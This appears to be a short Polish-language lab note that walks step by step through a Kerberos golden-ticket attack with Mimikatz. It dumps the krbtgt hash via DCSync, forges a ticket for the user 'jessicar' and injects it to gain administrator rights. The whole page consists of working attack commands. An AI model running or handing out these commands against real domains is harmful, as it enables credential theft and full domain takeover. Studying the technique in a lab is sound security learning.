---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Golden Ticket - Mimikatz WIN

{% code overflow="wrap" fullWidth="true" %}
```
#wchodzimy do katalogu C
$Env:LOGONSERVER
#i się wyświetla

#wchodzimy
dir \\WIN-1946GHJ\c$
dir \\WIN-1946GHJ\c$\Users\jessicar

#hash domeny
whoami /all
#i zapisujemy SID bez cyfr po ostatnim myślniku (to jest SID użytkownika)

#ściągamy mimikatz
https://github.com/gentilkiwi/mimikatz/releases

#uruchamiamy
.\mimikatz.exe

#dostajemy hash ntlm krbtgt
lsadump::dcsync /user:krbtgt
#kopiujemy ten hash ntlm

#generowanie golden ticketa i zapisał do pliku ticket.kirbi
kerberos::golden /domain:cyber.local /sid:<SID_DOMENY> /krbtgt:<hash_KRBTGT> /user:jessicar /group:500

#przelogowujemy się na weak usera
#uruchamiam mimikatz
.\mimikatz.exe

#ładuje ten golden ticket
kerberos::ptt c:\users\minniem\Desktop\ticket.kirbi

#lisuje sobie ticket
kerberos::list
#i mam już uprawnienia administratora
```
{% endcode %}
